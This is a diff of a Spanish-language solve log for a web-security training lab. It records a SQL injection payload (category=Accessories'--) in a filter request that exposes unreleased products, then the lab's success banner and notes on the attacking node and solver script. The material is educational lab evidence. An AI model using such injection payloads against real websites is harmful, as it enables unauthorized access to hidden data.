@@ -1,9 +1,19 @@
-### Request 1 — GET https://abc123.web-security-academy.net/ (root)
+### Request 1 — GET /filter?category=Accessories'-- (payload SQLi)
+Host: 0a43000904dc825588d0c94a00be0054.web-security-academy.net
 
-User-Agent: t
+HTTP 200 — productos ocultos revelados (evidencia de inyección efectiva):
+<h3>Cheshire Cat Grin</h3>
+<h3>ZZZZZZ Bed - Your New Home Office</h3>
+<h3>Giant Pillow Thing</h3>
+<h3>Six Pack Beer Belt</h3>
+→ La inyección eliminó el filtro AND released=1 → productos no publicados visibles.
 
-### Response 1 — HTTP 200
-
+### Request 2 — GET / (verificación solve)
+HTTP 200 — banner oficial:
 Congratulations, you solved the lab!
 
-========================================================================
+### Nota de ejecución
+- Nodo atacante: GEEKOM (100.123.17.12) — payload enviado vía solve-lab.py
+- Verificación: curl desde Air (control) contra instancia https://0a43000904dc825588d0c94a00be0054.web-security-academy.net
+- Session cookie: obtenida automáticamente por el solver
+- Fecha: 2026-08-10
